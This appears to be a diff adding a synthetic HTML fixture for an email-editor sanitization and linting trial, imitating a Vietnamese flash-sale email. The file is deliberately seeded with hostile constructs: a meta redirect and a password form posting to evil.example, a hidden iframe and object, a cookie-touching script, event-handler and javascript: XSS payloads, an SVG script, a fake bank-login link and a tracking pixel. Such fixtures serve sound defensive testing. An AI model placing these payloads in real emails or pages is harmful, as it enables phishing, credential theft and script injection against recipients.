@@ -1,0 +1,49 @@
+<!doctype html>
+<!-- SYNTHETIC FIXTURE (M3 editor trial): imitates div/column-based builder HTML and deliberately contains unsafe and email-unfriendly constructs to test sanitization and linting. Not a real company or campaign. -->
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<title>Flash sale cuối tuần (mẫu tổng hợp)</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;700&display=swap">
+<style>
+  body { margin:0; background:#fff7ee; font-family:'Be Vietnam Pro', Arial, sans-serif; }
+  .col { display:inline-block; vertical-align:top; width:290px; }
+  .cta { background:#d9480f; color:#fff; padding:12px 24px; border-radius:24px; text-decoration:none; display:inline-block; }
+  @media (max-width: 600px) { .col { width:100% !important; } .wrap { padding:12px !important; } }
+</style>
+<script>document.cookie = "steal=" + document.cookie;</script>
+</head>
+<body onload="alert('xss')">
+<div class="wrap" style="max-width:600px;margin:0 auto;padding:24px;background:#ffffff url('https://cdn.example/bg-pattern.png') repeat;">
+  <div style="text-align:center;">
+    <img src="images/logo-relative.png" alt="" width="120">
+    <img src="http://cdn.example/banner-http.png" width="600" style="width:100%;height:auto;">
+  </div>
+  <h1 style="font-size:28px;color:#d9480f;margin:16px 0 8px;">⚡ Flash sale 48 giờ cho {{ full_name }}!</h1>
+  <p style="font-size:16px;line-height:1.5;color:#333;">Chào {{greeting_name}}, cuối tuần này <b>mọi sản phẩm</b> giảm đến <span style="font-size:20px;color:#d9480f;">50%</span>. Mã giảm giá riêng của {{ ten_khach }}: <code>FLASH50</code>.</p>
+  <p style="font-size:14px;color:#555;">Áp dụng cho {{ company | defaul: "khách hàng thân thiết" }} đến hết Chủ nhật.</p>
+  <div>
+    <div class="col">
+      <img src="/fixtures/email/product-1.png" alt="{{ greeting_name | default: 'Bạn' }} ơi, xem sản phẩm này" width="290" style="width:100%;height:auto;">
+      <p style="margin:8px 0;"><a href="https://shop.example/p/1" onclick="steal()">Bình giữ nhiệt 500ml</a></p>
+    </div>
+    <div class="col">
+      <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="pixel" width="1" height="1">
+      <img src="/fixtures/email/product-2.png" onerror="alert(1)" alt="Túi vải canvas" width="290" style="width:100%;height:auto;">
+      <p style="margin:8px 0;"><a href="javascript:alert('xss')">Túi vải canvas</a></p>
+    </div>
+  </div>
+  <p style="text-align:center;margin:24px 0;"><a class="cta" href="http://shop.example/flash-sale" style="background:#d9480f;color:#fff;padding:12px 24px;border-radius:24px;text-decoration:none;display:inline-block;">Mua ngay</a></p>
+  <p style="text-align:center;"><a href="https://shop.example/tai-khoan">www.ngan-hang-that.example/dang-nhap</a></p>
+  <form action="https://evil.example/collect" method="post"><input name="password" type="password"><button>Gửi</button></form>
+  <iframe src="https://evil.example/frame" width="1" height="1"></iframe>
+  <object data="https://evil.example/flash.swf"></object>
+  <svg width="10" height="10"><script>alert('svg')</script><circle cx="5" cy="5" r="4" fill="#d9480f"/></svg>
+  <div style="background-image:url(javascript:alert(1));padding:4px;">Style với URL javascript</div>
+  <img src="https://tracker.example/open.gif?u=someone%40example.com" width="1" height="1" alt="">
+  <p style="font-size:11px;color:#888;">Shop Mẫu (tổng hợp) · Hà Nội · <a href="mailto:hotro@shop.example">hotro@shop.example</a> · <a href="tel:+84240000000">024 0000 0000</a> · <a href="#">Hủy đăng ký</a></p>
+</div>
+</body>
+</html>
